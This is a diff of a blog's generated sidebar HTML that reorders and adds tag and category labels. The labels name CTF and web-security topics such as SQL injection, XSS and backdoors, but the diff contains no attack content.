         <span class="sidebar-tag-name" data-tags="Python"><span class="iconfont-archer">&#xe606;</span>Python</span>
     
+        <span class="sidebar-tag-name" data-tags="Sycsec"><span class="iconfont-archer">&#xe606;</span>Sycsec</span>
+    
         <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
     
-        <span class="sidebar-tag-name" data-tags="upload_labs"><span class="iconfont-archer">&#xe606;</span>upload_labs</span>
+        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+    
+        <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
     
         <span class="sidebar-tag-name" data-tags="iOS越狱"><span class="iconfont-archer">&#xe606;</span>iOS越狱</span>
     
         <span class="sidebar-tag-name" data-tags="网络安全"><span class="iconfont-archer">&#xe606;</span>网络安全</span>
     
-        <span class="sidebar-tag-name" data-tags="安恒11月月赛"><span class="iconfont-archer">&#xe606;</span>安恒11月月赛</span>
+        <span class="sidebar-tag-name" data-tags="Security"><span class="iconfont-archer">&#xe606;</span>Security</span>
     
-        <span class="sidebar-tag-name" data-tags="MISC"><span class="iconfont-archer">&#xe606;</span>MISC</span>
+        <span class="sidebar-tag-name" data-tags="后门"><span class="iconfont-archer">&#xe606;</span>后门</span>
     
         <span class="sidebar-tag-name" data-tags="wifi密码破解"><span class="iconfont-archer">&#xe606;</span>wifi密码破解</span>
     
-        <span class="sidebar-tag-name" data-tags="代码审计"><span class="iconfont-archer">&#xe606;</span>代码审计</span>
+        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
     
         <span class="sidebar-tag-name" data-tags="php文件包含"><span class="iconfont-archer">&#xe606;</span>php文件包含</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
     
-        <span class="sidebar-tag-name" data-tags="php"><span class="iconfont-archer">&#xe606;</span>php</span>
+        <span class="sidebar-tag-name" data-tags="cumtCTF"><span class="iconfont-archer">&#xe606;</span>cumtCTF</span>
     
-        <span class="sidebar-tag-name" data-tags="南邮web"><span class="iconfont-archer">&#xe606;</span>南邮web</span>
+        <span class="sidebar-tag-name" data-tags="SQL注入"><span class="iconfont-archer">&#xe606;</span>SQL注入</span>
     
-        <span class="sidebar-tag-name" data-tags="Security"><span class="iconfont-archer">&#xe606;</span>Security</span>
-    
-        <span class="sidebar-tag-name" data-tags="后门"><span class="iconfont-archer">&#xe606;</span>后门</span>
+        <span class="sidebar-tag-name" data-tags="upload_labs"><span class="iconfont-archer">&#xe606;</span>upload_labs</span>
     
         <span class="sidebar-tag-name" data-tags="re"><span class="iconfont-archer">&#xe606;</span>re</span>
     
         <span class="sidebar-tag-name" data-tags="南邮Crypto"><span class="iconfont-archer">&#xe606;</span>南邮Crypto</span>
     
-        <span class="sidebar-tag-name" data-tags="实验吧web"><span class="iconfont-archer">&#xe606;</span>实验吧web</span>
+        <span class="sidebar-tag-name" data-tags="南邮web"><span class="iconfont-archer">&#xe606;</span>南邮web</span>
     
         <span class="sidebar-tag-name" data-tags="攻防世界xctf-web"><span class="iconfont-archer">&#xe606;</span>攻防世界xctf-web</span>
+    
+        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
+    
+        <span class="sidebar-tag-name" data-tags="0e开头MD5"><span class="iconfont-archer">&#xe606;</span>0e开头MD5</span>
     
         <span class="sidebar-tag-name" data-tags="物联网实践"><span class="iconfont-archer">&#xe606;</span>物联网实践</span>
     
         <span class="sidebar-tag-name" data-tags="SYN FLOOD"><span class="iconfont-archer">&#xe606;</span>SYN FLOOD</span>
     
-        <span class="sidebar-tag-name" data-tags="reverse"><span class="iconfont-archer">&#xe606;</span>reverse</span>
-    
-        <span class="sidebar-tag-name" data-tags="Coap"><span class="iconfont-archer">&#xe606;</span>Coap</span>
-    
         <span class="sidebar-tag-name" data-tags="2019全国信安赛"><span class="iconfont-archer">&#xe606;</span>2019全国信安赛</span>
     
-        <span class="sidebar-tag-name" data-tags="0e开头MD5"><span class="iconfont-archer">&#xe606;</span>0e开头MD5</span>
+        <span class="sidebar-tag-name" data-tags="实验吧web"><span class="iconfont-archer">&#xe606;</span>实验吧web</span>
     
         <span class="sidebar-tag-name" data-tags="攻防世界MISC"><span class="iconfont-archer">&#xe606;</span>攻防世界MISC</span>
+    
+        <span class="sidebar-tag-name" data-tags="Coap"><span class="iconfont-archer">&#xe606;</span>Coap</span>
     
     </div>
     <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
@@ -2007,17 +2197,17 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
-    
         <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
+    
+        <span class="sidebar-category-name" data-categories="算法"><span class="iconfont-archer">&#xe60a;</span>算法</span>
     
         <span class="sidebar-category-name" data-categories="Arduino"><span class="iconfont-archer">&#xe60a;</span>Arduino</span>
     
-        <span class="sidebar-category-name" data-categories="IoT"><span class="iconfont-archer">&#xe60a;</span>IoT</span>
+        <span class="sidebar-category-name" data-categories="Java"><span class="iconfont-archer">&#xe60a;</span>Java</span>
     
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
-        <span class="sidebar-category-name" data-categories="Java"><span class="iconfont-archer">&#xe60a;</span>Java</span>
+        <span class="sidebar-category-name" data-categories="IoT"><span class="iconfont-archer">&#xe60a;</span>IoT</span>
     
         <span class="sidebar-category-name" data-categories="Crypto"><span class="iconfont-archer">&#xe60a;</span>Crypto</span>
     
@@ -2025,9 +2215,9 @@ jsonContent:
     
         <span class="sidebar-category-name" data-categories="iOS越狱"><span class="iconfont-archer">&#xe60a;</span>iOS越狱</span>
     
-        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
-    
         <span class="sidebar-category-name" data-categories="Sec"><span class="iconfont-archer">&#xe60a;</span>Sec</span>
+    
+        <span class="sidebar-category-name" data-categories="ctf"><span class="iconfont-archer">&#xe60a;</span>ctf</span>
     
         <span class="sidebar-category-name" data-categories="Python"><span class="iconfont-archer">&#xe60a;</span>Python</span>
     
